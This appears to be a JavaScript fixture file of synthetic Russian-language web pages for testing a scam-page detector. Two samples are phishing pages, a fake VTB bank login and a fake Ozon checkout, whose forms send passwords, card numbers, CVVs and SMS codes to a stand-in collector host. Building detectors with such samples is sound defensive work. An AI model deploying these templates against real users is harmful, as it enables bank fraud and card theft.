// Controlled synthetic HTML, never fetched from real banks/shops. No network requests.
export const DEMO_SCENARIOS = {
  brand_clone: { url: 'https://vtb-login.example/confirm', label: 'Подмена банка', html: '<!doctype html><html lang="ru"><title>ВТБ — официальный личный кабинет</title><body><h1>ВТБ: проверка счёта</h1><p>Срочно переведите деньги на безопасный счёт. Не сообщайте никому об операции.</p><form action="https://collector.example/receive?token=demo" method="post"><label>Пароль от банка<input type="password" name="password"></label><label>Код из SMS<input name="sms_code" autocomplete="one-time-code"></label><button>Продолжить</button></form></body></html>' },
  shop_clone: {
    url: 'https://ozon-sale.example/checkout',
    label: 'Поддельный магазин',
    // Synthetic imitation only. Neither this page nor its form is opened or submitted.
    html: `<!doctype html><html lang="ru"><head><title>Ozon — официальный интернет-магазин</title><meta property="og:site_name" content="Ozon"></head><body>
      <h1>Ozon — официальный магазин. Оплата заказа</h1>
      <p>Ваша скидка действует только сегодня. Для оформления покупки укажите данные карты и код подтверждения.</p>
      <p>Доставка и возврат. Контакты магазина: support@example.test.</p>
      <form action="https://collector.example/payment" method="post">
        <label>Номер карты<input name="card_number" autocomplete="cc-number" inputmode="numeric"></label>
        <label>CVV/CVC<input name="cvv" autocomplete="cc-csc" inputmode="numeric"></label>
        <label>Код подтверждения из SMS<input name="sms_code" autocomplete="one-time-code" inputmode="numeric"></label>
        <button>Оплатить заказ</button>
      </form>
    </body></html>`,
  },
  ordinary_shop: { url: 'https://www.store.example/', label: 'Обычный магазин', html: '<!doctype html><html lang="ru"><title>Магазин «Тест»</title><body><h1>Товары для дома</h1><p>Доставка и возврат. Контакты: support@example.test. Оплата заказа после проверки.</p><form action="/search" method="get"><label>Поиск<input name="q" type="search"></label></form></body></html>' },
  challenge: { url: 'https://protected.example/', label: 'Страница недоступна', html: '<!doctype html><html><title>Just a moment...</title><body>Verify you are human. Checking your browser. CAPTCHA challenge.</body></html>' },
};
